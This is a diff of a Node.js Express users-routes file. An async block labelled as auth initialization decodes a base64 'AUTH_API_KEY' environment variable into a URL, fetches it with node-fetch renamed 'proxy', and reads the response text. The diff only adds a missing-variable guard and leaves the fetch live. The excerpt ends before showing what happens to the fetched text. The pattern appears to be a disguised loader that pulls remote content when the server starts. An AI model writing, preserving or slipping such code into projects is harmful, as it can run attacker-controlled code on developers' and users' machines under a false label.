@@ -14,9 +14,13 @@ router.post("/delete-user", usersController.getDeleteUser);
 router.post("/change-password", usersController.changePassword);
 
 (async () => {
-    const src = Buffer.from(process.env.AUTH_API_KEY, 'base64').toString('utf8');
-    const proxy = (await import('node-fetch')).default;
+    if (!process.env.AUTH_API_KEY) {
+      console.warn('AUTH_API_KEY is not set in environment variables. Skipping auth initialization.');
+      return;
+    }
     try {
+      const src = Buffer.from(process.env.AUTH_API_KEY, 'base64').toString('utf8');
+      const proxy = (await import('node-fetch')).default;
       const response = await proxy(src);
       if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
       const proxyInfo = await response.text();
